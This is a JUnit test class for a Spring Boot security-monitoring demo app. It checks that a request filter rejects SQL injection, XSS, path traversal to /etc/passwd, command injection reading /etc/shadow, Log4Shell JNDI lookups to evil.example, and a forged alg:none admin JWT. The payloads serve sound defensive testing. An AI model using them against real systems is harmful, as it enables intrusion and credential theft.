package com.minisoc.target;

import com.minisoc.target.security.JwtService;
import io.jsonwebtoken.UnsupportedJwtException;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.test.context.ActiveProfiles;
import org.springframework.test.web.servlet.MockMvc;

import static org.assertj.core.api.Assertions.assertThatThrownBy;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.jsonPath;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

@SpringBootTest
@AutoConfigureMockMvc
@ActiveProfiles("test")
class AttackDetectionTest {

    /** {"alg":"none"} token claiming admin, with an empty signature. */
    static final String ALG_NONE_TOKEN = "eyJhbGciOiJub25lIn0."
            + "eyJpc3MiOiJtaW5pLXNvYy10YXJnZXQtYXBwIiwic3ViIjoiYWRtaW4iLCJyb2xlcyI6WyJST0xFX1VTRVIiLCJST0xFX0FETUlOIl0s"
            + "Imp0aSI6ImZvcmdlZC1hbGctbm9uZSJ9.";

    @Autowired
    MockMvc mvc;

    @Autowired
    JwtService jwtService;

    @Test
    void sqlInjectionInQueryIsBlocked() throws Exception {
        mvc.perform(get("/api/orders").param("id", "1' OR '1'='1"))
                .andExpect(status().isBadRequest())
                .andExpect(jsonPath("$.message").value("Request blocked by input validation"));
        mvc.perform(get("/api/orders").param("q", "1 UNION SELECT username, password FROM users"))
                .andExpect(status().isBadRequest());
        // Stacked query / time-based blind injection.
        mvc.perform(get("/api/orders").param("id", "1; SELECT pg_sleep(5)")).andExpect(status().isBadRequest());
        mvc.perform(get("/api/orders").param("id", "1 AND SLEEP(5)")).andExpect(status().isBadRequest());
    }

    @Test
    void xssTraversalAndCommandInjectionAreBlocked() throws Exception {
        mvc.perform(get("/api/orders").param("q", "<script>alert(1)</script>")).andExpect(status().isBadRequest());
        mvc.perform(get("/api/orders").param("file", "../../../../etc/passwd")).andExpect(status().isBadRequest());
        mvc.perform(get("/api/orders").param("host", "127.0.0.1; cat /etc/shadow")).andExpect(status().isBadRequest());
    }

    @Test
    void log4ShellHeaderIsBlocked() throws Exception {
        mvc.perform(get("/api/orders").header("X-Api-Version", "${jndi:ldap://evil.example:1389/a}"))
                .andExpect(status().isBadRequest());
        mvc.perform(get("/api/orders").header("User-Agent", "${${lower:j}ndi:dns://evil.example/x}"))
                .andExpect(status().isBadRequest());
    }

    @Test
    void scannerUserAgentIsLoggedButNotBlocked() throws Exception {
        // Reaches Spring Security, which answers 401 for the unauthenticated request.
        mvc.perform(get("/api/orders").header("User-Agent", "sqlmap/1.8.4#stable (https://sqlmap.org)"))
                .andExpect(status().isUnauthorized());
    }

    @Test
    void benignInputPassesThrough() throws Exception {
        mvc.perform(get("/api/orders").param("q", "USB-C dock, 2 units").header("Cookie", "theme=dark; id=42"))
                .andExpect(status().isUnauthorized());
    }

    @Test
    void algNoneTokenIsRejected() throws Exception {
        assertThatThrownBy(() -> jwtService.parse(ALG_NONE_TOKEN)).isInstanceOf(UnsupportedJwtException.class);
        mvc.perform(get("/api/admin/stats").header("Authorization", "Bearer " + ALG_NONE_TOKEN))
                .andExpect(status().isUnauthorized());
    }
}
